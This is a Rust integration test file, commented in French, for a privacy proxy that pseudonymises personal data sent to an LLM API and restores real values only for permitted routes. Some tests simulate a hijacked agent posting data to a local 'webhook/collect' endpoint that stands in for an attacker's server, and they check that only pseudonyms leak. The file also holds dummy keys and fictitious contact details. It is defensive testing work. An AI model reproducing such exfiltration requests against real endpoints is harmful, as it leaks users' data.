//! Bouclier de confidentialité de bout en bout : une fausse API Anthropic note ce qu'elle reçoit et
//! renvoie, en flux, les pseudonymes qu'elle a vus (coupés au milieu) et un appel d'outil.
//! Le fournisseur ne doit rien voir de réel ; l'agent doit recevoir les vraies valeurs.

use aestheris::proxy;
use aestheris::run;
use aestheris::vault::{KdfParams, Vault};
use axum::extract::{Request, State};
use std::sync::{Arc, Mutex};
use tokio::net::TcpListener;

const PASSWORD: &str = "mot de passe de test solide";
const REAL_SECRET: &str = "sk-ant-api03-VraieCleUltraSecrete0123456789";

#[derive(Default, Clone)]
struct Seen {
    bodies: Vec<String>,
    headers: Vec<String>,
}

type Log = Arc<Mutex<Seen>>;

/// Fausse API Messages : renvoie les pseudonymes reçus, en SSE (stream: true) ou en JSON.
async fn fake_anthropic() -> (u16, Log) {
    let log: Log = Arc::new(Mutex::new(Seen::default()));
    async fn handle(State(log): State<Log>, req: Request) -> axum::response::Response {
        let headers = format!("{:?}", req.headers());
        let body = axum::body::to_bytes(req.into_body(), 1 << 20)
            .await
            .unwrap();
        let text = String::from_utf8_lossy(&body).to_string();
        {
            let mut l = log.lock().unwrap();
            l.bodies.push(text.clone());
            l.headers.push(headers);
        }
        let re = regex::Regex::new(r"\[[A-Z]+_\d+\]").unwrap();
        let mut tokens: Vec<String> = re
            .find_iter(&text)
            .map(|m| m.as_str().to_string())
            .collect();
        tokens.sort();
        tokens.dedup();
        let joined = tokens.join(" et ");
        let v: serde_json::Value = serde_json::from_slice(&body).unwrap();
        if v["stream"].as_bool() == Some(true) {
            // texte coupé au milieu des pseudonymes, puis un appel d'outil avec le premier
            let reply = format!("J'ai vu : {joined}.");
            let mut sse = String::from(
                "event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"m1\"}}\n\n",
            );
            sse.push_str("event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"text\",\"text\":\"\"}}\n\n");
            for piece in reply.as_bytes().chunks(5) {
                let frag = String::from_utf8_lossy(piece).to_string();
                let ev = serde_json::json!({"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":frag}});
                sse.push_str(&format!("event: content_block_delta\ndata: {ev}\n\n"));
            }
            sse.push_str("event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n");
            let args = serde_json::json!({ "to": tokens.first().cloned().unwrap_or_default() })
                .to_string();
            for piece in args.as_bytes().chunks(4) {
                let frag = String::from_utf8_lossy(piece).to_string();
                let ev = serde_json::json!({"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":frag}});
                sse.push_str(&format!("event: content_block_delta\ndata: {ev}\n\n"));
            }
            sse.push_str("event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":1}\n\n");
            sse.push_str("event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n");
            axum::response::Response::builder()
                .header("content-type", "text/event-stream")
                .body(axum::body::Body::from(sse))
                .unwrap()
        } else {
            let out = serde_json::json!({ "content": [{ "type": "text", "text": format!("Vu : {joined}") }] });
            axum::response::Response::builder()
                .header("content-type", "application/json")
                .body(axum::body::Body::from(out.to_string()))
                .unwrap()
        }
    }
    let app = axum::Router::new().fallback(handle).with_state(log.clone());
    let l = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = l.local_addr().unwrap().port();
    tokio::spawn(async move { axum::serve(l, app).await.unwrap() });
    (port, log)
}

#[tokio::test]
async fn le_fournisseur_ne_voit_que_des_pseudonymes() {
    let dir = tempfile::tempdir().unwrap();
    let (port, log) = fake_anthropic().await;
    let vault = dir.path().join("vault.json");
    Vault::create(&vault, PASSWORD, KdfParams::insecure_for_tests())
        .unwrap()
        .set("anthropic/api", REAL_SECRET)
        .unwrap();
    let policy = dir.path().join("aestheris.yaml");
    std::fs::write(
        &policy,
        format!(
            r#"version: 1
routes:
  anthropic:
    upstream: http://localhost:{port}
    secret: anthropic/api
    inject: {{ header: x-api-key, format: "{{}}" }}
    privacy: true
    rules:
      - {{ action: allow, methods: [POST], path: "/v1/messages" }}
privacy:
  terms:
    CLIENT: ["Dupont SA"]
    PROJET: ["Phoenix"]
network:
  allow_insecure_loopback: true
"#
        ),
    )
    .unwrap();
    let audit = dir.path().join("audit.ndjson");
    let (gw, _) = run::prepare(&policy, &vault, &audit, PASSWORD).unwrap();
    let running = proxy::start(gw.clone(), 0).await.unwrap();
    let url = format!("http://{}/anthropic/v1/messages", running.addr);
    let token = gw.token_for_agent().to_string();
    let http = reqwest::Client::new();
    let ask = |stream: bool| {
        http.post(&url)
            .header("authorization", format!("Bearer {token}"))
            .header("x-stainless-os", "MacOS")
            .header("x-stainless-arch", "arm64")
            .header("content-type", "application/json")
            .body(
                serde_json::json!({
                    "model": "claude-test",
                    "stream": stream,
                    "metadata": { "user_id": "user_camille_session_42" },
                    "system": "Projet Phoenix pour Dupont SA",
                    "messages": [{ "role": "user", "content": "Relance marie.durand@dupont.fr au +33 6 12 34 56 78" }]
                })
                .to_string(),
            )
            .send()
    };

    // 1. Flux SSE : texte et appel d'outil rétablis, même coupés au milieu des pseudonymes.
    let body = ask(true).await.unwrap().text().await.unwrap();
    let mut text = String::new();
    let mut args = String::new();
    for line in body.lines().filter_map(|l| l.strip_prefix("data: ")) {
        let v: serde_json::Value = serde_json::from_str(line).unwrap();
        text.push_str(v["delta"]["text"].as_str().unwrap_or(""));
        args.push_str(v["delta"]["partial_json"].as_str().unwrap_or(""));
    }
    for real in [
        "marie.durand@dupont.fr",
        "Dupont SA",
        "Phoenix",
        "+33 6 12 34 56 78",
    ] {
        assert!(
            text.contains(real),
            "« {real} » absent de la réponse rétablie : {text}"
        );
    }
    let tool: serde_json::Value = serde_json::from_str(&args).unwrap();
    assert!(
        [
            "Dupont SA",
            "marie.durand@dupont.fr",
            "Phoenix",
            "+33 6 12 34 56 78"
        ]
        .contains(&tool["to"].as_str().unwrap()),
        "argument d'outil non rétabli : {args}"
    );

    // 2. Réponse JSON complète : rétablie aussi, avec les mêmes pseudonymes (stables).
    let json: serde_json::Value =
        serde_json::from_str(&ask(false).await.unwrap().text().await.unwrap()).unwrap();
    assert!(
        json["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("Dupont SA")
    );

    // 3. Contenu non JSON sur une route confidentielle : refusé.
    let raw = http
        .post(&url)
        .header("authorization", format!("Bearer {token}"))
        .body("texte brut avec marie.durand@dupont.fr")
        .send()
        .await
        .unwrap();
    assert_eq!(raw.status(), 403);

    running.stop().await;

    // Ce que le fournisseur a vu : aucune valeur réelle, aucune métadonnée identifiante.
    let seen = log.lock().unwrap().clone();
    assert_eq!(seen.bodies.len(), 2);
    for b in &seen.bodies {
        for real in [
            "marie",
            "dupont.fr",
            "Dupont",
            "Phoenix",
            "12 34 56",
            "user_camille",
        ] {
            assert!(!b.contains(real), "« {real} » envoyé au fournisseur : {b}");
        }
        assert!(
            b.contains("[EMAIL_1]")
                && b.contains("[CLIENT_1]")
                && b.contains("[PROJET_1]")
                && b.contains("[TEL_1]")
        );
    }
    assert_eq!(
        seen.bodies[0].matches("[EMAIL_1]").count(),
        seen.bodies[1].matches("[EMAIL_1]").count()
    );
    for h in &seen.headers {
        assert!(
            !h.contains("x-stainless") && !h.contains("MacOS"),
            "en-têtes identifiants transmis : {h}"
        );
        assert!(h.contains(REAL_SECRET), "la vraie clé doit être injectée");
    }

    // Registre d'exposition : catégories et nombres, jamais les valeurs.
    let audit_text = std::fs::read_to_string(&audit).unwrap();
    assert!(
        audit_text.contains("confidentialité : CLIENT×"),
        "{audit_text}"
    );
    assert!(!audit_text.contains("marie"));
    assert!(aestheris::audit::verify(&audit).unwrap().ok);
}

/// Service qui note ce qu'il reçoit (joue le CRM de l'entreprise, ou le serveur d'un pirate).
async fn recorder() -> (u16, Arc<Mutex<Vec<String>>>) {
    let got: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
    async fn handle(State(got): State<Arc<Mutex<Vec<String>>>>, req: Request) -> &'static str {
        let q = req.uri().query().unwrap_or("").to_string();
        let body = axum::body::to_bytes(req.into_body(), 1 << 20)
            .await
            .unwrap();
        got.lock()
            .unwrap()
            .push(format!("{q} {}", String::from_utf8_lossy(&body)));
        "{\"ok\":true}"
    }
    let app = axum::Router::new().fallback(handle).with_state(got.clone());
    let l = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = l.local_addr().unwrap().port();
    tokio::spawn(async move { axum::serve(l, app).await.unwrap() });
    (port, got)
}

/// Données fantômes : l'adresse d'un client ne redevient réelle qu'à l'écran et vers le CRM.
/// Un agent détourné (injection de prompt) qui l'envoie ailleurs n'envoie qu'un pseudonyme.
#[tokio::test]
async fn donnees_fantomes_un_agent_detourne_n_exfiltre_que_des_pseudonymes() {
    let dir = tempfile::tempdir().unwrap();
    let (llm_port, _) = fake_anthropic().await;
    let (crm_port, crm) = recorder().await;
    let (evil_port, evil) = recorder().await;
    let vault = dir.path().join("vault.json");
    let mut v = Vault::create(&vault, PASSWORD, KdfParams::insecure_for_tests()).unwrap();
    v.set("anthropic/api", REAL_SECRET).unwrap();
    v.set("crm/api", "crm_live_CleDuCrm0123456789").unwrap();
    v.set("autre/api", concat!("autre_Cle", "Quelconque0123456789"))
        .unwrap();
    let policy = dir.path().join("aestheris.yaml");
    std::fs::write(
        &policy,
        format!(
            r#"version: 1
routes:
  anthropic:
    upstream: http://localhost:{llm_port}
    secret: anthropic/api
    inject: {{ header: x-api-key, format: "{{}}" }}
    privacy: true
    rules:
      - {{ action: allow, methods: [POST], path: "/v1/messages" }}
  crm:
    upstream: http://localhost:{crm_port}
    secret: crm/api
    inject: {{ header: Authorization, format: "Bearer {{}}" }}
    rules:
      - {{ action: allow, methods: [POST], path: "/**" }}
  webhook:
    upstream: http://localhost:{evil_port}
    secret: autre/api
    inject: {{ header: Authorization, format: "Bearer {{}}" }}
    rules:
      - {{ action: allow, methods: [POST], path: "/**" }}
privacy:
  release:
    EMAIL: [human, route:crm]      # l'adresse n'est réelle qu'à l'écran et dans le CRM
network:
  allow_insecure_loopback: true
"#
        ),
    )
    .unwrap();
    let audit = dir.path().join("audit.ndjson");
    let (gw, _) = run::prepare(&policy, &vault, &audit, PASSWORD).unwrap();
    let running = proxy::start(gw.clone(), 0).await.unwrap();
    let base = format!("http://{}", running.addr);
    let token = gw.token_for_agent().to_string();
    let http = reqwest::Client::new();

    // Le modèle voit « [EMAIL_1] » et répond en l'utilisant dans son texte et un appel d'outil.
    let body = http
        .post(format!("{base}/anthropic/v1/messages"))
        .header("authorization", format!("Bearer {token}"))
        .header("content-type", "application/json")
        .body(
            serde_json::json!({ "model": "m", "stream": true,
                "messages": [{ "role": "user", "content": "Le client marie.durand@dupont.fr attend." }] })
            .to_string(),
        )
        .send()
        .await
        .unwrap()
        .text()
        .await
        .unwrap();
    let (mut text, mut args) = (String::new(), String::new());
    for line in body.lines().filter_map(|l| l.strip_prefix("data: ")) {
        let v: serde_json::Value = serde_json::from_str(line).unwrap();
        text.push_str(v["delta"]["text"].as_str().unwrap_or(""));
        args.push_str(v["delta"]["partial_json"].as_str().unwrap_or(""));
    }
    assert!(
        text.contains("marie.durand@dupont.fr"),
        "l'humain voit la vraie adresse : {text}"
    );
    let tool: serde_json::Value = serde_json::from_str(&args).unwrap();
    assert_eq!(
        tool["to"], "[EMAIL_1]",
        "l'agent n'agit que sur le pseudonyme"
    );

    // L'agent transmet ce qu'il a : vers le CRM (formulaire), la vraie adresse arrive.
    let r = http
        .post(format!("{base}/crm/contacts?email=%5BEMAIL_1%5D"))
        .header("authorization", format!("Bearer {token}"))
        .header("content-type", "application/x-www-form-urlencoded")
        .body("email=%5BEMAIL_1%5D&note=relance")
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
    // Agent détourné : il envoie le même contenu ailleurs (JSON) → seul le pseudonyme sort.
    let r = http
        .post(format!("{base}/webhook/collect"))
        .header("authorization", format!("Bearer {token}"))
        .header("content-type", "application/json")
        .body(r#"{"leak":"[EMAIL_1]"}"#)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
    running.stop().await;

    let crm = crm.lock().unwrap().join("\n");
    assert!(
        crm.contains("email=marie.durand%40dupont.fr email=marie.durand%40dupont.fr&note=relance"),
        "{crm}"
    );
    let evil = evil.lock().unwrap().join("\n");
    assert!(
        evil.contains("[EMAIL_1]") && !evil.contains("marie"),
        "exfiltration : {evil}"
    );
    let log = std::fs::read_to_string(&audit).unwrap();
    assert!(log.contains("données fantômes : libéré EMAIL×2"), "{log}");
    assert!(log.contains("données fantômes : retenu EMAIL×1"), "{log}");
    assert!(!log.contains("marie"));
}

/// Faux CRM : renvoie une fiche client en JSON (sous « data », comme beaucoup d'API).
async fn fake_crm() -> u16 {
    let app = axum::Router::new().fallback(|| async {
        axum::Json(serde_json::json!({ "data": [
            { "name": "Dupont SA", "email": "marie@dupont.fr", "phone": "+33 6 12 34 56 78" }
        ]}))
    });
    let l = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = l.local_addr().unwrap().port();
    tokio::spawn(async move { axum::serve(l, app).await.unwrap() });
    port
}

/// Provenance + disjoncteur : les données du CRM n'atteignent l'agent que sous forme de
/// pseudonymes, ne redeviennent réelles que vers les destinations permises pour le CRM, et une
/// tentative de les envoyer ailleurs déclenche le disjoncteur.
#[tokio::test]
async fn provenance_et_disjoncteur() {
    let dir = tempfile::tempdir().unwrap();
    let crm_port = fake_crm().await;
    let (mail_port, mail) = recorder().await;
    let (evil_port, evil) = recorder().await;
    let vault = dir.path().join("vault.json");
    let mut v = Vault::create(&vault, PASSWORD, KdfParams::insecure_for_tests()).unwrap();
    for n in ["crm/api", "mail/api", "autre/api"] {
        v.set(n, "cle_de_test_0123456789abcdef").unwrap();
    }
    let policy = dir.path().join("aestheris.yaml");
    std::fs::write(
        &policy,
        format!(
            r#"version: 1
routes:
  crm:
    upstream: http://localhost:{crm_port}
    secret: crm/api
    inject: {{ header: Authorization, format: "Bearer {{}}" }}
    phantom: true                    # source de données : l'agent n'en voit que des pseudonymes
    rules: [ {{ action: allow, methods: [GET], path: "/**" }} ]
  mail:
    upstream: http://localhost:{mail_port}
    secret: mail/api
    inject: {{ header: Authorization, format: "Bearer {{}}" }}
    rules: [ {{ action: allow, methods: [POST], path: "/**" }} ]
  webhook:
    upstream: http://localhost:{evil_port}
    secret: autre/api
    inject: {{ header: Authorization, format: "Bearer {{}}" }}
    rules: [ {{ action: allow, methods: [POST], path: "/**" }} ]
privacy:
  terms:
    CLIENT: ["Dupont SA"]
  origins:
    crm: [human, route:mail]         # une donnée du CRM ne sort réelle que vers le service mail
guard:
  max_withheld: 1
  on_trip: stop
network:
  allow_insecure_loopback: true
"#
        ),
    )
    .unwrap();
    let audit = dir.path().join("audit.ndjson");
    let (gw, _) = run::prepare(&policy, &vault, &audit, PASSWORD).unwrap();
    let running = proxy::start(gw.clone(), 0).await.unwrap();
    let base = format!("http://{}", running.addr);
    let token = gw.token_for_agent().to_string();
    let http = reqwest::Client::new();
    let post = |route: &str, body: &str| {
        http.post(format!("{base}/{route}"))
            .header("authorization", format!("Bearer {token}"))
            .header("content-type", "application/json")
            .body(body.to_string())
            .send()
    };

    // 1. L'agent lit le CRM : il ne reçoit que des pseudonymes (même sous « data »).
    let fiche = http
        .get(format!("{base}/crm/contacts"))
        .header("authorization", format!("Bearer {token}"))
        .send()
        .await
        .unwrap()
        .text()
        .await
        .unwrap();
    for real in ["Dupont", "marie", "12 34 56"] {
        assert!(
            !fiche.contains(real),
            "« {real} » a atteint l'agent : {fiche}"
        );
    }
    assert!(
        fiche.contains("[CLIENT_1]") && fiche.contains("[EMAIL_1]") && fiche.contains("[TEL_1]")
    );

    // 2. Vers le service mail (permis pour le CRM) : la vraie adresse arrive.
    assert_eq!(
        post("mail/send", r#"{"to":"[EMAIL_1]"}"#)
            .await
            .unwrap()
            .status(),
        200
    );
    // 3. Agent détourné : vers un autre service, seul le pseudonyme sort.
    assert_eq!(
        post("webhook/collect", r#"{"x":"[EMAIL_1]"}"#)
            .await
            .unwrap()
            .status(),
        200
    );
    // 4. Le disjoncteur a sauté : plus rien ne passe, même vers le service mail.
    let r = post("mail/send", r#"{"to":"[EMAIL_1]"}"#).await.unwrap();
    assert_eq!(r.status(), 403);
    assert!(r.text().await.unwrap().contains("disjoncteur"));
    running.stop().await;

    let mail = mail.lock().unwrap().clone();
    assert_eq!(
        mail.len(),
        1,
        "une seule requête doit avoir atteint le service mail : {mail:?}"
    );
    assert!(mail[0].contains("marie@dupont.fr"));
    let evil = evil.lock().unwrap().join("\n");
    assert!(
        evil.contains("[EMAIL_1]") && !evil.contains("marie"),
        "{evil}"
    );
    let log = std::fs::read_to_string(&audit).unwrap();
    assert!(log.contains("\"kind\":\"guard_tripped\""), "{log}");
    assert!(log.contains("source crm : pseudonymisé"), "{log}");
    assert!(!log.contains("marie"));
    assert!(aestheris::audit::verify(&audit).unwrap().ok);
}
